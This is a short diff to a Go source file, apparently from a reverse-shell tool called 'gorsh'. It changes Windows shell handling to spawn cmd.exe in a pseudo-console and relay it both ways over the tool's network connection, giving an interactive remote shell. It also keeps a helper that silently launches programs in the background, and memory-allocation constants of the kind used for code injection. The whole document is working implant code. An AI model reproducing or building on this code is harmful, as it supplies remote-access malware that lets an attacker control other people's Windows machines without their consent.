@@ -1,10 +1,16 @@
 package shell
 
 import (
+	"context"
 	"encoding/base64"
+	"fmt"
+	"io"
 	"os/exec"
 	"syscall"
 	"unsafe"
+
+	"git.hyrule.link/blink/gorsh/pkg/myconn"
+	"github.com/UserExistsError/conpty"
 )
 
 const (
@@ -12,15 +18,29 @@ const (
 	MEM_RESERVE = 0x2000
 )
 
-func GetShell() *exec.Cmd {
-	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	return cmd
+func GetShell() error {
+	commandLine := `c:\windows\system32\cmd.exe`
+	cpty, err := conpty.Start(commandLine)
+	if err != nil {
+		return fmt.Errorf("Failed to spawn a pty: %w", err)
+	}
+	defer cpty.Close()
+
+	go func() {
+		go io.Copy(myconn.Conn, cpty)
+		io.Copy(cpty, myconn.Conn)
+	}()
+
+	_, err = cpty.Wait(context.Background())
+	if err != nil {
+		return fmt.Errorf("conpty.wait: %w", err)
+	}
+	return nil
 }
 
 // func BGExec() *exec.Cmd {
 func BGExec(prog string, args []string) (int, error) {
-	cmd := GetShell()
+	cmd := exec.Command(`c:\windows\system32\cmd.exe`)
 	cmd.Args = append(cmd.Args, "/c", "start", "/B", prog)
 	cmd.Args = append(cmd.Args, args...)
 	err := cmd.Start()
